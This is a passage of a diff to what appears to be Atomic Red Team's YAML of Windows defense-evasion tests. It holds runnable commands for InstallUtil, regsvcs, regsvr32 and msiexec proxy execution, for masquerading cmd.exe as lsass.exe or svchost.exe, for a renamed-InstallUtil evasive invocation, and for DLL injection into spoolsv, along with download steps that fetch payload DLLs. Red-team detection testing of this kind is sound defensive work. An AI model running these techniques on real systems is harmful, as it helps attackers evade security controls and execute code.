       description: 'Executes the Uninstall Method
 
 '
       supported_platforms:
       - windows
       input_arguments:
-        filename:
-          description: location of the payload
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.dll
-        source:
-          description: location of the source code to compile
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.cs
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
-    - name: InstallUtil GetHelp method call
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_Uninstall_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall'
+        variant
       description: 'Executes the Uninstall Method
 
 '
       supported_platforms:
       - windows
       input_arguments:
-        filename:
-          description: location of the payload
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.dll
-        source:
-          description: location of the source code to compile
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.cs
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_Uninstall_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil HelpText method call
+      description: 'Executes the Uninstall Method
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/? `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_HelpText_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil evasive invocation
+      description: 'Executes an InstallUtil assembly by renaming InstallUtil.exe and
+        using a nonstandard extension for the assembly.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "$Env:windir\System32\Tasks"
+          $InstallerAssemblyFileName = 'readme.txt'
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "readme.txt"
+          $ExpectedOutput = 'Constructor_'
+
+          # Explicitly set the directory so that a relative path to readme.txt can be supplied.
+          Set-Location "$Env:windir\System32\Tasks"
+
+          Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = 'Executable'
+              CommandLine = $CommandLine
+              InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |-
+          Remove-Item -Path "$Env:windir\System32\Tasks\readme.txt"
+          Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallLog"
+          Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallState"
+          Remove-Item -Path "$Env:windir\System32\Tasks\notepad.exe"
   T1152:
     technique:
       x_mitre_permissions_required:
@@ -9278,7 +9677,7 @@ defense-evasion:
         command: |
           cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
           cmd.exe /c %SystemRoot%\Temp\lsass.exe
-        cleanup_command: 'del /Q /F %SystemRoot%\Temp\lsass.exe
+        cleanup_command: 'del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1
 
 '
     - name: Masquerading as Linux crond process.
@@ -9307,7 +9706,7 @@ defense-evasion:
         command: |
           copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
           cmd.exe /c %APPDATA%\notepad.exe /B
-        cleanup_command: 'del /Q /F %APPDATA%\notepad.exe
+        cleanup_command: 'del /Q /F %APPDATA%\notepad.exe >nul 2>&1
 
 '
     - name: Masquerading - wscript.exe running as svchost.exe
@@ -9323,7 +9722,7 @@ defense-evasion:
         command: |
           copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
           cmd.exe /c %APPDATA%\svchost.exe /B
-        cleanup_command: 'del /Q /F %APPDATA%\svchost.exe
+        cleanup_command: 'del /Q /F %APPDATA%\svchost.exe >nul 2>&1
 
 '
     - name: Masquerading - powershell.exe running as taskhostw.exe
@@ -9339,7 +9738,7 @@ defense-evasion:
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
           cmd.exe /K %APPDATA%\taskhostw.exe
-        cleanup_command: 'del /Q /F %APPDATA%\taskhostw.exe
+        cleanup_command: 'del /Q /F %APPDATA%\taskhostw.exe >nul 2>&1
 
 '
     - name: Masquerading - non-windows exe running as windows exe
@@ -9353,11 +9752,18 @@ defense-evasion:
         inputfile:
           description: path of file to copy
           type: path
-          default: "$PathToAtomicsFolder\\T1036\\bin\\t1036.exe"
+          default: PathToAtomicsFolder\T1036\bin\t1036.exe
         outputfile:
           description: path of file to execute
           type: path
           default: ($env:TEMP + "\svchost.exe")
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Exe file to copy must exist on disk at specified location (#{inputfile})
+        prereq_command: 'if (Test-Path #{inputfile}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inputfile}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/t1036.exe" -OutFile "#{inputfile}"
       executor:
         name: powershell
         elevation_required: false
@@ -9407,8 +9813,8 @@ defense-evasion:
           copy C:\Windows\System32\cmd.exe C:\lsm.exe
           C:\lsm.exe /c echo T1036 > C:\T1036.txt
         cleanup_command: |
-          del C:\T1036.txt
-          del C:\lsm.exe
+          del C:\T1036.txt >nul 2>&1
+          del C:\lsm.exe >nul 2>&1
   T1112:
     technique:
       x_mitre_data_sources:
@@ -9784,13 +10190,13 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        local_file:
+        local_file_path:
           description: Create a local VBScript file
           type: path
           default: C:\Temp\mshta_notepad.vbs
       executor:
         name: command_prompt
-        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
+        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
 
 '
     - name: Mshta executes VBScript to execute malicious command
@@ -10343,7 +10749,7 @@ defense-evasion:
         dll_path:
           description: Path of the dll to inject
           type: string
-          default: "$PathToAtomicsFolder\\T1502\\bin\\calc.dll"
+          default: PathToAtomicsFolder\T1502\bin\calc.dll
         dll_process_name:
           description: Name of the created process from the injected dll
           type: string
@@ -10356,6 +10762,13 @@ defense-evasion:
           description: Name of the process to spawn
           type: string
           default: iexplore
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL to inject must exist on disk at specified location (#{dll_path})
+        prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1502/bin/calc.dll" -OutFile "#{dll_path}"
       executor:
         name: powershell
         elevation_required: false
@@ -10689,8 +11102,15 @@ defense-evasion:
           default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
         process_id:
           description: PID of input_arguments
-          type: Int
+          type: Integer
           default: "(get-process spoolsv).id"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Utility to inject must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
       executor:
         name: powershell
         elevation_required: true
@@ -10710,7 +11130,7 @@ defense-evasion:
           default: T1055.dll
         process_id:
           description: PID of input_arguments
-          type: Int
+          type: Integer
           default: "(get-process spoolsv).id"
       executor:
         name: powershell
@@ -10788,8 +11208,8 @@ defense-evasion:
           copy C:\Windows\System32\cmd.exe C:\svchost.exe
           C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
         cleanup_command: |
-          del C:\T1055.txt
-          del C:\svchost.exe
+          del C:\T1055.txt >nul 2>&1
+          del C:\svchost.exe >nul 2>&1
   T1121:
     technique:
       x_mitre_data_sources:
@@ -10857,21 +11277,29 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        file_name:
+        output_file:
           description: Location of the payload
           type: Path
-          default: T1121.dll
+          default: "%tmp%\\T1121.dll"
         source_file:
           description: Location of the CSharp source_file
           type: Path
           default: PathToAtomicsFolder\T1121\src\T1121.cs
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The CSharp source file must exist on disk at specified location
+          (#{source_file})
+        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs" -OutFile "#{source_file}"
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-        cleanup_command: 'del #{file_name}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library #{source_file}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
+        cleanup_command: 'del #{output_file} >nul 2>&1
 
 '
     - name: Regsvs Uninstall Method Call Test
@@ -10882,26 +11310,36 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        file_name:
+        output_file:
           description: Location of the payload
           type: Path
-          default: T1121.dll
+          default: "$Env:TEMP\\T1121.dll"
         source_file:
           description: Location of the CSharp source_file
           type: Path
           default: PathToAtomicsFolder\T1121\src\T1121.cs
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The CSharp source file must exist on disk at specified location
+          (#{source_file})
+        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs" -OutFile "#{source_file}"
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
           $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
           $Content = [System.Convert]::FromBase64String($key)
-          Set-Content key.snk -Value $Content -Encoding Byte
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
-        cleanup_command: |-
-          del #{file_name} >$null 2>&1
-          del key.snk >$null 2>&1
+          Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk #{source_file}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
+        cleanup_command: |
+          Remove-Item #{output_file} -ErrorAction Ignore | Out-Null
+          $parentpath = Split-Path -Path "#{output_file}"
+          Remove-Item $parentpath\key.snk -ErrorAction Ignore | Out-Null
+          Remove-Item $parentpath\T1121.tlb -ErrorAction Ignore | Out-Null
   T1117:
     technique:
       x_mitre_data_sources:
@@ -10983,7 +11421,14 @@ defense-evasion:
         filename:
           description: Name of the local file, include path.
           type: Path
-          default: PathToAtomicsFolder\T1117\RegSvr32.sct
+          default: PathToAtomicsFolder\T1117\src\RegSvr32.sct
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Regsvr32.exe must exist on disk at specified location (#{filename})
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/src/RegSvr32.sct" -OutFile "#{filename}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -11001,7 +11446,7 @@ defense-evasion:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -11020,11 +11465,19 @@ defense-evasion:
           description: Name of DLL to Execute, DLL Should export DllRegisterServer
           type: Path
           default: PathToAtomicsFolder\T1117\bin\AllTheThingsx86.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: AllTheThingsx86.dll must exist on disk at specified location
+          (#{dll_name})
+        prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
       executor:
         name: command_prompt
         elevation_required: false
-        command: '"IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
-          /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )"
+        command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
+          /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
 
 '
   T1014:
@@ -11254,6 +11707,13 @@ defense-evasion:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -11272,6 +11732,13 @@ defense-evasion:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -11290,6 +11757,13 @@ defense-evasion:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -11309,6 +11783,13 @@ defense-evasion:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -11417,7 +11898,7 @@ defense-evasion:
         command: "C:\\Windows\\system32\\cmd.exe /Q /c echo #{command_to_execute}
           > #{script_to_create}\nC:\\Windows\\system32\\cmd.exe /Q /c #{script_to_create}
           \n"
-        cleanup_command: 'del #{script_to_create}
+        cleanup_command: 'del #{script_to_create} >nul 2>&1
 
 '
   T1218:
@@ -11545,6 +12026,13 @@ defense-evasion:
           description: PID of process receiving injection
           type: string
           default: 1000
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -11580,6 +12068,13 @@ defense-evasion:
           description: DLL to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
@@ -11596,6 +12091,11 @@ defense-evasion:
           description: MSI file to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218.msi must exist on disk at specified location (#{msi_payload})
+        prereq_command: 'if (Test-Path #{msi_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: Write-Host "You must provide your own MSI"
       executor:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
@@ -11630,6 +12130,13 @@ defense-evasion:
           description: DLL to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         command: 'msiexec.exe /y "#{dll_payload}"
@@ -11646,6 +12153,13 @@ defense-evasion:
           description: DLL to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
@@ -11663,6 +12177,13 @@ defense-evasion:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: INF file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
